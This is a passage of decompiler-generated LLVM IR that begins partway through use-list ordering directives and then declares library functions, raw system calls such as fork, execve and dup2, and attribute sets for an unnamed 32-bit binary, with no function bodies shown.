413, 808, 134, 226, 227, 809, 810, 414, 811, 812, 813, 814, 85, 900, 901, 902, 903, 92, 193, 135, 228, 99, 815, 194, 415, 416, 417, 816, 136, 817, 506, 905, 736, 737, 738, 266, 739, 507, 906, 104, 229, 521, 740, 907, 476, 908, 909, 910, 477, 911, 508, 473, 912, 913, 914, 694, 915, 137, 916, 927, 928, 24, 108, 418, 25, 419, 420, 934, 938, 195, 939, 138, 357, 267, 268, 933, 6, 917, 918, 919, 139, 474, 374, 140, 421, 522, 7, 230, 231, 141, 523, 524, 142, 143, 526, 525, 527, 528, 269, 358, 529, 531, 530, 532, 920, 921, 144, 422, 926, 554, 555, 556, 557, 423, 424, 558, 254, 425, 232, 145, 146, 426, 478, 427, 479, 147, 428, 148, 429, 533, 62, 534, 535, 536, 8, 430, 734, 270, 480, 481, 482, 483, 431, 149, 929, 359, 150, 233, 930, 932, 931, 743, 744, 745, 746, 747, 234, 748, 749, 750, 271, 741, 272, 742, 273, 432, 433, 274, 360, 434, 275, 361, 151, 435, 751, 752, 152, 153, 276, 362, 106, 753, 754, 755, 154, 155, 277, 363, 105, 756, 196, 757, 93, 758, 759, 761, 436, 760, 655, 437, 235, 656, 438, 657, 658, 659, 661, 662, 663, 664, 665, 666, 667, 668, 669, 567, 568, 26, 158, 236, 63, 156, 157, 10, 11, 237, 935, 937, 159, 612, 579, 160, 161, 818, 819, 107, 820, 162, 439, 821, 197, 822, 64, 660, 238, 239, 163, 823, 824, 825, 670, 671, 672, 673, 164, 710, 65, 440, 711, 441, 713, 712, 198, 442, 443, 714, 716, 715, 199, 444, 674, 717, 509, 826, 827, 828, 829, 830, 831, 832, 833, 834, 165, 445, 835, 240, 836, 837, 838, 839, 840, 27, 28, 446, 210, 211, 841, 842, 843, 844, 29, 845, 846, 847, 30, 447, 848, 31, 32, 166, 448, 849, 850, 851, 854, 852, 853, 33, 42, 66, 855, 856, 857, 858, 255, 859, 860, 167, 861, 168, 862, 449, 200, 863, 169, 864, 450, 865, 866, 868, 869, 870, 871, 872, 873, 170, 451, 452, 171, 874, 875, 453, 876, 877, 878, 879, 880, 454, 881, 882, 241, 455, 242, 883, 884, 885, 886, 887, 888, 34, 67, 68, 69, 456, 889, 172, 457, 890, 364, 891, 892, 173, 458, 94, 40, 86, 867, 201, 922, 923, 202, 925, 924, 70, 278, 459, 718, 719, 720, 721, 722, 723, 724, 725, 726, 727, 243, 728, 460, 461, 729, 175, 176, 174, 365, 177, 366, 510, 203, 511, 512, 244, 245, 513, 367, 514, 212, 368, 515, 178, 516, 517, 518, 246, 893, 179, 730, 462, 732, 904, 559, 695, 898, 936, 899, 475, 762, 731, 484, 493, 485, 486, 487, 488, 489, 490, 491, 492, 494, 495, 496, 497, 498, 499, 500, 501, 502, 279, 503, 207, 74, 73, 504, 505, 206, 72, 71, 537, 213, 538, 539, 540, 541, 542, 543, 376, 544, 214, 215, 545, 546, 547, 548, 251, 75, 549, 550, 551, 552, 553, 216, 217, 280, 369, 370, 180, 252, 560, 561, 562, 563, 564, 565, 281, 566, 35, 43, 76, 569, 36, 37, 247, 570, 181, 248, 249, 283, 675, 80, 676, 677, 678, 182, 79, 679, 378, 288, 289, 78, 680, 681, 682, 183, 77, 284, 683, 285, 371, 684, 282, 379, 290, 291, 286, 372, 184, 287, 373, 685, 686, 687, 377, 380, 688, 689, 690, 691, 81, 82, 83, 84, 692, 693, 185, 292, 293, 186, 696, 294, 697, 187, 188, 253, 295, 698, 699, 189, 250, 16, 44, 17, 45, 733, 38, 763, 940, 941, 256, 942, 943, 9, 894, 895, 896, 190, 463, 204, 296, 297, 298, 299, 300, 301, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 325, 326, 327, 328, 329, 330, 331, 332, 333, 334, 335, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 353, 354, 355, 356, 944, 945, 946, 947, 948, 949, 950, 951 }
  uselistorder i32* @ebx, { 36, 220, 221, 348, 349, 121, 123, 126, 127, 128, 129, 130, 124, 122, 125, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 151, 152, 0, 153, 154, 155, 156, 157, 158, 159, 49, 50, 350, 351, 352, 222, 3, 223, 224, 225, 4, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 353, 354, 355, 356, 160, 161, 295, 296, 453, 454, 6, 164, 162, 163, 165, 170, 166, 167, 171, 172, 173, 5, 175, 174, 1, 176, 177, 178, 179, 180, 181, 7, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 51, 52, 53, 54, 55, 56, 57, 58, 237, 238, 239, 240, 8, 241, 9, 242, 243, 357, 358, 359, 360, 10, 361, 362, 363, 11, 364, 12, 365, 366, 367, 368, 13, 369, 370, 371, 372, 373, 374, 375, 459, 460, 14, 461, 462, 465, 466, 78, 79, 80, 81, 376, 377, 82, 83, 467, 468, 297, 15, 298, 299, 84, 85, 469, 470, 98, 300, 471, 60, 472, 473, 474, 475, 476, 477, 86, 87, 59, 478, 479, 480, 481, 482, 216, 217, 301, 302, 483, 484, 485, 34, 35, 498, 499, 500, 507, 508, 509, 510, 31, 16, 29, 501, 504, 505, 506, 486, 99, 100, 101, 102, 103, 104, 105, 106, 487, 488, 489, 490, 497, 115, 116, 61, 62, 63, 64, 65, 66, 107, 108, 17, 2, 109, 290, 291, 68, 110, 111, 112, 67, 69, 292, 293, 294, 502, 503, 70, 71, 72, 73, 303, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 18, 318, 319, 304, 305, 320, 321, 322, 323, 324, 325, 326, 327, 328, 329, 330, 32, 331, 332, 333, 334, 335, 19, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 196, 197, 198, 199, 200, 201, 20, 202, 203, 204, 511, 512, 513, 514, 515, 516, 517, 520, 521, 168, 169, 378, 379, 380, 381, 382, 383, 384, 385, 386, 205, 206, 207, 208, 21, 22, 209, 210, 211, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 212, 213, 214, 215, 260, 261, 262, 263, 387, 388, 389, 390, 391, 392, 393, 394, 395, 396, 397, 398, 399, 400, 401, 402, 403, 404, 405, 406, 407, 408, 409, 410, 411, 412, 413, 414, 415, 416, 417, 423, 424, 23, 425, 426, 427, 428, 429, 430, 431, 432, 433, 434, 435, 436, 437, 24, 438, 439, 440, 441, 442, 74, 75, 76, 77, 418, 420, 419, 421, 422, 491, 25, 492, 493, 494, 495, 33, 26, 30, 496, 522, 523, 524, 525, 526, 264, 265, 266, 267, 268, 269, 27, 270, 28, 271, 272, 273, 274, 275, 276, 277, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 443, 444, 445, 446, 447, 448, 278, 279, 282, 283, 284, 463, 464, 117, 118, 218, 219, 455, 456, 518, 519, 457, 458, 346, 347, 280, 281, 113, 114, 119, 120, 285, 286, 287, 288, 289, 527, 528, 529, 530, 449, 450, 451, 452 }
}

; Function Attrs: nounwind readnone
declare i32 @llvm.ctlz.i32(i32, i1) #1

; Function Attrs: nounwind readnone
declare i32 @llvm.bswap.i32(i32) #1

declare i32 @_strlen(i8*) local_unnamed_addr

declare i8* @_memset(i8*, i32, i32) local_unnamed_addr

declare i8* @_memcpy(i8*, i8*, i32) local_unnamed_addr

declare i32 @_strncmp(i8*, i8*, i32) local_unnamed_addr

; Function Attrs: nounwind readnone
declare i16 @llvm.bswap.i16(i16) #1

declare i32 @unknown_0(i32) local_unnamed_addr

declare i32 @close(i32) local_unnamed_addr

declare i32 @fork(i32) local_unnamed_addr

declare i32 @getpid(i32) local_unnamed_addr

declare i32 @ioctl(i32, i32, ...) local_unnamed_addr

declare i32 @kill(i32, i32) local_unnamed_addr

declare i32 @int80_syscall(i32) local_unnamed_addr

declare i32 @time(i32*) local_unnamed_addr

declare i32 @write(i32, i32*, i32) local_unnamed_addr

declare i32 @sigreturn(%sigcontext*) local_unnamed_addr

declare i32 @vfork() local_unnamed_addr

declare i32* @mmap(i32*, i32, i32, i32, i32, i32) local_unnamed_addr

declare i32 @fcntl(i32, i32, ...) local_unnamed_addr

declare i32 @sigaction(i32, %sigaction*, %sigaction*) local_unnamed_addr

declare void @exit(i32) local_unnamed_addr

declare i32 @clock_getres(i32, %timespec*) local_unnamed_addr

declare i32 @dup2(i32, i32) local_unnamed_addr

declare i32 @execve(i8*, [1 x i8*], [1 x i8*]) local_unnamed_addr

declare i32 @munmap(i32*, i32) local_unnamed_addr

declare i32 @nanosleep(%timespec*, %timespec*) local_unnamed_addr

declare i32 @open(i8*, i32, ...) local_unnamed_addr

declare i32 @pipe([2 x i32]) local_unnamed_addr

declare i32 @sigprocmask(i32, %_TYPEDEF_sigset_t*, %_TYPEDEF_sigset_t*) local_unnamed_addr

declare i32 @wait4(i32, i32, i32, %rusage*) local_unnamed_addr

declare i32 @poll(%pollfd*, i32, i32) local_unnamed_addr

declare i32 @read(i32, i32*, i32) local_unnamed_addr

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i8* @__decompiler_undefined_function_1() local_unnamed_addr

declare i64 @__decompiler_undefined_function_2() local_unnamed_addr

declare i16 @__decompiler_undefined_function_3() local_unnamed_addr

declare i16* @__decompiler_undefined_function_4() local_unnamed_addr

declare i8 @__decompiler_undefined_function_5() local_unnamed_addr

declare %sigaction* @__decompiler_undefined_function_6() local_unnamed_addr

declare %timespec* @__decompiler_undefined_function_7() local_unnamed_addr

declare %_TYPEDEF_sigset_t* @__decompiler_undefined_function_8() local_unnamed_addr

declare %rusage* @__decompiler_undefined_function_9() local_unnamed_addr

declare x86_fp80 @__decompiler_undefined_function_10() local_unnamed_addr

attributes #0 = { noreturn }
attributes #1 = { nounwind readnone }
